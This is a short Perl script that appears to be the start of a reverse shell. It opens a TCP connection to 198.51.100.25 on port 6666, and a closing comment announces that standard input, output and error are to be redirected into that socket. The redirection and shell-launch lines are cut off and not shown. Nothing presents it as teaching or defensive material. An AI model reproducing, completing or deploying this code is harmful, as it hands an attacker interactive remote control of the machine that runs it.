use strict;
use warnings;
use IO::Socket;

# Define the target IP and Port
my $target_ip = '198.51.100.25';
my $target_port = 6666;

# Create a new socket object
my $socket = IO::Socket::INET->new(
    PeerAddr => $target_ip,
    PeerPort => $target_port,
    Proto    => 'tcp',
) or die "Cannot connect to $target_ip:$target_port\n";

# Redirect STDIN, STDOUT, and STDERR to the socket
